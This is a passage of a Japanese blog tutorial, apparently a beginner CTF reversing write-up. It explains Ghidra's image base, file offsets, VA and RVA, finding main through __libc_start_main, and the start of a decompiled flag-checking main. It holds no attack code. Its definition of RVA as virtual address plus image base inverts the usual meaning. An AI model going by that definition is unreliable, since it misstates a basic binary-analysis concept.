&lt;p&gt;これは、Ghidraのアドレスとして表示されるのはバイナリの実際のアドレスではなく、RVA(相対仮想アドレス)と呼ばれるアドレスだからです。&lt;/p&gt;
&lt;p&gt;RVAは、仮想アドレスにベースアドレスやイメージベースと呼ばれるアドレスを加算したものです。&lt;/p&gt;
&lt;p&gt;GhidraでELFファイルをロードする際に[Options]から[Image Base]の欄を確認すると、デフォルトで&lt;code class=&quot;language-text&quot;&gt;0x100000&lt;/code&gt;となっていたことがわかります。&lt;/p&gt;
&lt;p&gt;そのため、このイメージベースに実際の仮想アドレス&lt;code class=&quot;language-text&quot;&gt;0x1100&lt;/code&gt;を加算した&lt;code class=&quot;language-text&quot;&gt;0x101100&lt;/code&gt;が、GhidraにRVAとして表示されているというわけです。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/83d8750d5cf9aaca6bb1b983c6853b55/0b533/image-34.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 55.00000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAACYUlEQVQoz11STW/TQBD1D6YSpWkT9SNNDy1N0gIn7hx75cSFMwRUaFrbseOPeP25tuOP2E6rIqHHeC2EhKWn9c7uzrx5b6SL8wvs7b7EYHCAQf8Aw+MjjE6HmE7GePvmGq8vzjE8OcZoeNKBzo6PDnFzc4MkTbEunlHVDR6fUjz/qiH9uL/Dz7kM22XwogDrdY4sL5BlRbf+RbvPcrHmRQk/jMDjGM0WqJvf2JRbpGUB6ev9F3ybq7DsFXTDwop5sFYubOd/eOKs/XdcH7Pvt5jNZkiTDdI8R7GuUKRbSH4QwuMZPn76jN7+Pi4vx5hMrwSmV9cYT6a4HE8wGp3h9HSE/X4fr3o9vNjZweHhAGdnI/RJqt7eLj68fwepqokzfZtyAx5FYI6DhaZj/qAQZMiqBnWhQdFNyLqFhapAJei6Dk2jM3UBz/fBefdWqpouYV3XcBwGVVFgWgZM20LEOXLSpShLJFkJ24vgex5c14VC92RZFsVbc7L1GhERkraPTyJh09SkR0JBDsZSeF5GVTe0J/ACKz+ERToGJBGnQrZlY0ksl4aBkBK1SYMggOQGMYqqQRSndMDpcUoGcWi6i7ni4E5hYG4ML+TCGM/zEZO7PrVp2zYM00RMRKqq7hi2Dt8qBgzLgUMu8iQlJGIkQoGEHlCMCjouTQAxY4zBpEQWJTRpz+lOlmUIwxDSkj0gSYhlQVrRfOV5O2eFWLtYF08oqb40BYuSDLTcAAF1w/wIFvOFzjFJIQWkTdtGW9Uhl/6trjCp/V+tViLe6ta22Wqlkuv3iyUeNIPmlgl2HnXwB7gBAouispHdAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/83d8750d5cf9aaca6bb1b983c6853b55/8ac56/image-34.webp 240w,
/static/83d8750d5cf9aaca6bb1b983c6853b55/d3be9/image-34.webp 480w,
/static/83d8750d5cf9aaca6bb1b983c6853b55/b0a15/image-34.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/83d8750d5cf9aaca6bb1b983c6853b55/8ff5a/image-34.png 240w,
/static/83d8750d5cf9aaca6bb1b983c6853b55/e85cb/image-34.png 480w,
/static/83d8750d5cf9aaca6bb1b983c6853b55/0b533/image-34.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/83d8750d5cf9aaca6bb1b983c6853b55/0b533/image-34.png&quot;
            alt=&quot;2021/12/image-34.png&quot;
            title=&quot;2021/12/image-34.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ちなみに、Ghidraのイメージベースの設定は任意に変更ができます。&lt;/p&gt;
&lt;p&gt;そのため、このアドレスを&lt;code class=&quot;language-text&quot;&gt;0x555555555000&lt;/code&gt;などに設定しておくことで、gdbなどと併用する場合に表示されるアドレスをそろえることもできます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/cf30037c5f57e03e2822dfb9977a3d08/0b533/image-36.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 47.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAARlAAAEZQAGA43XUAAABoElEQVQoz41TaW+bQBTk//+2qm1qR7HByxHHCMyxh4G9mT7jplWlNsqTht0PO/OuIUmzDE9PO9R1h77v0Q09hJSQQmAcR4ycgzGG/X6HY1ogz3KUZY22GdE0HEoo3OYbhFL0niPR1uFUXLBYQJsVUltoF+EjEFZsZ0/CalqxGIPJzXAxYg0WMTqsq4end++R8DmglgThkL0qnCqFtJAomxkXbnEeLV5SBik1Fu3BpaWqNLSaCAucsTAhINyTrCsSqSPeuCMYsFogbyZU/UJiBudhQUX4vn+B954IER/FJiiWsIm8tgZVrenUqClBqyJVbnG8Dviy+/Eg/CL9D1vL92F+/faM5howUFVqErDBbLPzNERDl/TEfhP+LbQ+st0F53nC8XBC3wXMs8Oy3NBdDaz90wZjxV+CH0ViaHN1fQXLPbQOMIZavhhw7hFo2M4FnN/OtNH4YbvvSCJ9hp6TEIhEVolhI8e4kuADbdvis5GwokKWV+TFCs+HDIesQMpK5EWJoryjouoLdN3D+MMwbIbnZHhO5hcEST+Col0IPuAnmRQCBVKSxxMAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/cf30037c5f57e03e2822dfb9977a3d08/8ac56/image-36.webp 240w,
/static/cf30037c5f57e03e2822dfb9977a3d08/d3be9/image-36.webp 480w,
/static/cf30037c5f57e03e2822dfb9977a3d08/b0a15/image-36.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/cf30037c5f57e03e2822dfb9977a3d08/8ff5a/image-36.png 240w,
/static/cf30037c5f57e03e2822dfb9977a3d08/e85cb/image-36.png 480w,
/static/cf30037c5f57e03e2822dfb9977a3d08/0b533/image-36.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/cf30037c5f57e03e2822dfb9977a3d08/0b533/image-36.png&quot;
            alt=&quot;2021/12/image-36.png&quot;
            title=&quot;2021/12/image-36.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;上記の画像はイメージベースを&lt;code class=&quot;language-text&quot;&gt;0x555555555000&lt;/code&gt;に設定した場合のエントリポイントの逆アセンブル結果です。&lt;/p&gt;
&lt;h3 id=&quot;rva--va--offsetについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#rva--va--offset%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;rva  va  offsetについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;RVA / VA / Offsetについて&lt;/h3&gt;
&lt;p&gt;ここまでなんとなくRVAやアドレス(仮想アドレス)、オフセットといった用語を使ってきたので軽く整理しておこうと思います。&lt;/p&gt;
&lt;p&gt;まずファイルオフセットはシンプルにバイナリの先頭から何バイト目かという位置を表します。&lt;/p&gt;
&lt;p&gt;バイナリエディタで開いた時に0x100バイト目にあるデータのファイルオフセットは、同じく0x100になります。&lt;/p&gt;
&lt;p&gt;次に仮想アドレス（VA）についてです。&lt;/p&gt;
&lt;p&gt;この記事では仮想アドレスの詳細については触れませんが、簡単に言えば「ファイルオフセットに各セクションの開始位置を加算」したものが仮想アドレスとなります。&lt;/p&gt;
&lt;p&gt;プログラムがOSで実行されるとき、当然実行されるプログラムはメモリに展開されるわけですが、この時実際のメモリアドレス（物理アドレス）に展開してしまうと、複数のアプリケーションを平行して稼働させる必要のあるシステムではメモリアドレスの競合など、様々な弊害が発生します。&lt;/p&gt;
&lt;p&gt;これらの問題を回避するため、LinuxなどのOSで実行されるアプリケーションがメモリアドレスを参照するときは、物理アドレスではなく、仮想アドレス（VA）と呼ばれるアドレスを参照します。&lt;/p&gt;
&lt;p&gt;この仮想アドレスは、各セクションの先頭にオフセットを加算したものとなります。&lt;/p&gt;
&lt;p&gt;例えば、セクションの境界が0x1000に設定されている.dataセクションに存在するデータのファイルオフセットが0x3000の場合、仮想アドレスは0x4000になります。&lt;/p&gt;
&lt;p&gt;そして最後、RVAですが、これは前述した通り仮想アドレスにさらにイメージベースのアドレスを加算したアドレスです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://tech-zealots.com/malware-analysis/understanding-concepts-of-va-rva-and-offset/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Understanding Concepts Of VA, RVA and Offset | Tech Zealots&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;各アドレスとオフセットの違いや用途については少々わかりづらいとは思いますが、入門的なCTFの問題を解くためにはあまり使わないので、難しい場合は一旦飛ばしてもらって問題ありません。&lt;/p&gt;
&lt;p&gt;バイナリを触っていくうちにイメージがつくようになると思います。&lt;/p&gt;
&lt;h3 id=&quot;エントリポイントからmain関数を特定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%8B%E3%82%89main%E9%96%A2%E6%95%B0%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;エントリポイントからmain関数を特定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;エントリポイントからmain関数を特定する&lt;/h3&gt;
&lt;p&gt;話を解析に戻します。&lt;/p&gt;
&lt;p&gt;エントリポイントのデコンパイル結果を見ると&lt;code class=&quot;language-text&quot;&gt;__libc_start_main&lt;/code&gt;が存在することがわかります。&lt;/p&gt;
&lt;p&gt;この関数は、ELFバイナリが実行されるときに必ず最初に呼び出される初期化ルーチンです。&lt;/p&gt;
&lt;p&gt;そして、この&lt;code class=&quot;language-text&quot;&gt;__libc_start_main&lt;/code&gt;の第一引数にはmain関数のアドレスが渡されることが決まっています。&lt;/p&gt;
&lt;p&gt;つまり、&lt;code class=&quot;language-text&quot;&gt;__libc_start_main&lt;/code&gt;の第一引数を調べれば、今回の問題バイナリのようにシンボル情報がないバイナリであってもmain関数のアドレスを特定することができるようになるのです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://refspecs.linuxbase.org/LSB_3.1.0/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;_&lt;em&gt;libc&lt;/em&gt;start_main&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/9885545/how-to-find-the-main-functions-entry-point-of-elf-executable-file-without-any-s&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;linux - How to find the main function’s entry point of elf executable file without any symbolic information? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;というわけで、&lt;code class=&quot;language-text&quot;&gt;FUN_00101208&lt;/code&gt;がmain関数であることが特定できました。&lt;/p&gt;
&lt;p&gt;このままでは分かりづらいので、&lt;code class=&quot;language-text&quot;&gt;FUN_00101208&lt;/code&gt;を右クリックして[Rename Function]から関数名をmainに変更しておきましょう。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/ab02e5c74c2e877478451166cc7a396c/0b533/image-37.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 115.41666666666669%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAXCAYAAAALHW+jAAAACXBIWXMAARlAAAEZQAGA43XUAAADcElEQVQ4y5VV246bVhT1d6fvjRSllRpFrfKS16QT9WGkPLWqmlZRlUx9w8bG4xv3O+ZyMBg4wOqGNFE7M/JMj7R1MJh11l577c3ghxfv8eirX/Hdsw94/vwjXr4c4tXrMS4uJri8nOHnX5Z49/s1/nh/jQ9XGwhzGbudBVGWICkbKJqN4XSO4WiKyVTA4HqtwHYSaLqAlTqDpGnY2kdYyRFmfESQ5khYhjwvURQVirJCVXEUVYmSorvOTyd6VkLaqhjougFe1yizCOLlTxi/foXJj28weXOB3du3sGYzBDED5zXuW1vdx8AwdIRpA9d0sHrxPa6+fgzh228wevIEi6dPof/2Dn6SoiRm3Wrb9s7oATUXA9MyESUchpdiqam4ktYYr3f4c7bAeCvDiRgsy6X0+BfAf6//AOoeBrIsI2I1FDOGKIoQ50sostaHrpkwLQ+q8VBAYigIApJjg8XuiMlMwnQ2h0pAfhDB80NYTgDN/B8MO8CYNJTkHOOpCEEQsSd2rhdQ+HBcHzrp+2DA6XSKuGeYYb4ysFgK2O03iOIUIenXRXfN6+YWwM3fa/WflEPWYLJKsdEYsmwHlip32uImu5uAm67Kw9GI0mkRJgmZ16NgqHmDpuFom4qiRlVzYsjvZdinPByNCaCC43jwyDq6m0DxTRxSC06yg5eo8FkAdmIPACSGfw3H1AUZga1g+xqORYam5ajbBryLhrRrH5Zyz1BcSNSPCaJoCT9SkFfF53/eeunzi2cZCjORAKmaoQSPAE/8dLZf77XNx6sR6pqsES3gHWwyeUEHNNS7JWl7Qkly5LTnnFOhblvnVpUF6oyy5GRgtQfUTQbTzWAdTMSJg7yIERcpkqIgrflZQEW3qZcVFVVZIwhChEcPZf0p5Rbt2ZTvAjQsAlwsJeRZBcYYpURzkWpS0gGcvMh5SfdooNYlVbu+d3zpJgF2w6Ale9iuQammdEoO3UpgeTHpqlDX6NTrFkVAwFVvobOAe1np2RxCMm+WIDvxnmWW11Ssqi9Ed2DHvkVz1gGG5XwC7FaShD2oZaZYb1O4bkhShFTpjDRm/TeDHen7kZ8QsxKnPCIijOQ50jPWS6NoMgazxQqGn2JPdK9Vk7ykQlJ1qI4PzT1AtoJ+V+wIeyum+xF2ZkR70IdNI84LfLi+j4Uk4W/Mb9XGocpyAQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/ab02e5c74c2e877478451166cc7a396c/8ac56/image-37.webp 240w,
/static/ab02e5c74c2e877478451166cc7a396c/d3be9/image-37.webp 480w,
/static/ab02e5c74c2e877478451166cc7a396c/b0a15/image-37.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/ab02e5c74c2e877478451166cc7a396c/8ff5a/image-37.png 240w,
/static/ab02e5c74c2e877478451166cc7a396c/e85cb/image-37.png 480w,
/static/ab02e5c74c2e877478451166cc7a396c/0b533/image-37.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/ab02e5c74c2e877478451166cc7a396c/0b533/image-37.png&quot;
            alt=&quot;2021/12/image-37.png&quot;
            title=&quot;2021/12/image-37.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Ghidaを使って解析を行う場合には、関数名や変数名を任意に変更ができるので、その都度分かりやすい名前に変更してあげるとより効率的に解析を進めることができます。&lt;/p&gt;
&lt;h3 id=&quot;main関数のデコンパイル結果を見る&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#main%E9%96%A2%E6%95%B0%E3%81%AE%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E7%B5%90%E6%9E%9C%E3%82%92%E8%A6%8B%E3%82%8B&quot; aria-label=&quot;main関数のデコンパイル結果を見る permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;main関数のデコンパイル結果を見る&lt;/h3&gt;
&lt;p&gt;まずはmain関数のデコンパイル結果を見てみましょう。（長いのでローカル変数の定義などはカットしてます）&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;/* 中略 */&lt;/span&gt; 
  local_20 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;in_FS_OFFSET &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    
  &lt;span class=&quot;token comment&quot;&gt;/* ユーザからの標準入力(stdin)を受けとって local_68 に格納している */&lt;/span&gt; 
  &lt;span class=&quot;token function&quot;&gt;__printf_chk&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;What\&apos;s the flag? &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;/* 中略 */&lt;/span&gt; 
  pcVar3 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;local_68&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pcVar3 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;				    
    &lt;span class=&quot;token function&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;no!!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    iVar2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    
  &lt;span class=&quot;token comment&quot;&gt;/* 改行文字を特定し、ヌル文字に変更 */&lt;/span&gt; 
  &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    sVar4 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strcspn&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;local_68&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;	 
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;undefined &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;local_68 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; sVar4&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    lVar5 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  
  &lt;span class=&quot;token comment&quot;&gt;/* 謎のループ処理 */&lt;/span&gt; 
    &lt;span class=&quot;token keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      cVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;FUN_001011e9&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;local_68 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; lVar5&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;local_68 